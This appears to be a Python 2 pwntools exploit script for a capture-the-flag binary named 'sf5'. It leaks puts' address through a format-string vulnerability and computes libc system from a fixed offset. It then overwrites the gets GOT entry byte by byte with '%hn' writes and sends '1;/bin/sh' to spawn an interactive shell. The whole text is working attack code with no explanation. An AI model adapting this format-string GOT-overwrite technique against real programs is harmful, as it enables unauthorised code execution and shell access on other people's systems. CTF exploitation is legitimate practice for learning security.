from pwn import*
p = process('./sf5')
# gadget
puts_got = 0x601018
gets_got = 0x601048
# leak
p.recvuntil('exit\n')
pay = ''
pay += 'aaaa%7$s'+p64(puts_got)
p.send(pay)

p.recv(4)
libc_puts = u64(p.recv(6).ljust(8,'\x00'))
libc_system = libc_puts - 0x2a300
log.info("libc_puts : {}".format(hex(libc_puts)))
log.info("libc_system : {}".format(hex(libc_system)))
print "clear leak"

# exploit
for i in range(6):
	tmp = libc_system%0x100
	print hex(tmp)

	pay = ''
	pay += '%'+str(tmp)+'d'
	pay += '%8$hn'
	pay += 'a'*(0x10-len(pay))
	pay += p64(gets_got+i)
	p.send(pay);sleep(0.5)

	libc_system = libc_system//0x100

p.sendline('1;/bin/sh')
print "clear exploit"

p.interactive()
